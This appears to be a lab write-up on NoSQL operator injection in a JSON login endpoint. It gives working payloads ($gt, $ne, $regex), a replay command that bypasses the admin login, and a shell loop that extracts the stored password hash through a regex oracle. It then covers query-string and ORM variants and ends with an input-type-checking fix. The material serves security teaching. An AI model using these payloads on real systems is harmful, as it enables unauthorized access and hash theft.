# Lab 15 — Vaultdoor

## The observation that starts it

The README says passwords are stored as SHA-256 and compared as values. So this
login has **never worked for anybody**: a typed password is 64 hex characters
short of matching a hash. That is not a hint about a bug; it is the bug,
visible from the outside.

## The bug

```python
query = {"username": payload.get("username"), "password": payload.get("password")}
```

The JSON the client sent becomes the query document. In MongoDB, Mongoose,
Sequelize and every other store with this shape, a **scalar means equality and
an object means operators**:

```json
{"password": "hunter2"}        → password == "hunter2"
{"password": {"$gt": ""}}      → password > ""        ← true of every string
{"password": {"$ne": null}}    → password exists
{"password": {"$regex": "^a"}} → password starts with 'a'
```

The client chooses which of those the server runs, because the client chooses
the JSON type.

## The exploit

```bash
h5i websec replay req_0 --session lab15 --create \
    --set method=POST --set path=/api/login \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set 'json.password={"$gt":""}'
```

**The single most important detail in this lab:** a `--set` value that parses as
JSON is sent as JSON. So `json.password={"$gt":""}` makes the field an *object*.
Had h5i sent the string `"{\"$gt\":\"\"}"`, the matcher would have compared it
to a hash and failed, and you would have concluded the endpoint was not
vulnerable.

Check what actually went out whenever a payload's type matters:

```bash
h5i websec show req_1 --session lab15 --raw
```

```
{"username":"admin","password":{"$gt":""}}
```

Quote it in the shell (`'json.password={"$gt":""}'`) so `$gt` is not eaten as a
shell variable — a mistake that produces `{"":""}` and a mystifying negative.

## Extraction, not just bypass

`$regex` turns the login into the boolean oracle of Lab 13:

```bash
for c in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  printf '%s ' "$c"
  h5i websec replay req_0 --session lab15 --create --reset-budget \
      --set method=POST --set path=/api/login --set header.Content-Type=application/json \
      --set json.username=admin --set "json.password={\"\$regex\":\"^$c\"}" |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

200 means the hash starts with that character. Anchor forward one character at a
time and you have the stored hash, offline-crackable at leisure.

## Where else the type is the payload

The same trick, other syntaxes:

* **Query strings.** PHP and Express turn `?password[$ne]=1` into a nested
  object before your code sees it. Also `?user[]=a&user[]=b` → an array where
  the code expected a string, which breaks `==` comparisons and `.includes`.
* **Sequelize / TypeORM.** `{"id": {"$gt": 0}}` or `[Op.gt]` reachable through
  `where: req.query`.
* **GraphQL filters** that pass a filter object through to the ORM.
* **JSON booleans and nulls.** `{"is_admin": true}` vs `"true"` (Lab 09).
* **Arrays where a string was expected.** `{"role": ["user","admin"]}` matched
  with `$in` semantics, or a length check that passes on the array.

Whenever a JSON body reaches a query builder, the *type* of each field is an
input you control. Sweep types, not just values.

## The fix

Cast at the boundary, before the value can reach the query:

```python
username = payload.get("username")
password = payload.get("password")
if not isinstance(username, str) or not isinstance(password, str):
    return js({"error": "bad request"}, 400)
```

Then verify the password with a constant-time hash comparison rather than by
including it in the query at all — the credential check should be
`verify(password, row["password_hash"])`, never a `WHERE` clause. Schema
validation at the edge (JSON Schema, pydantic, zod) makes this systematic.

## h5i technique

JSON-typed `--set` values, and `websec show req_N --raw` to confirm the wire
form when the type is the exploit.
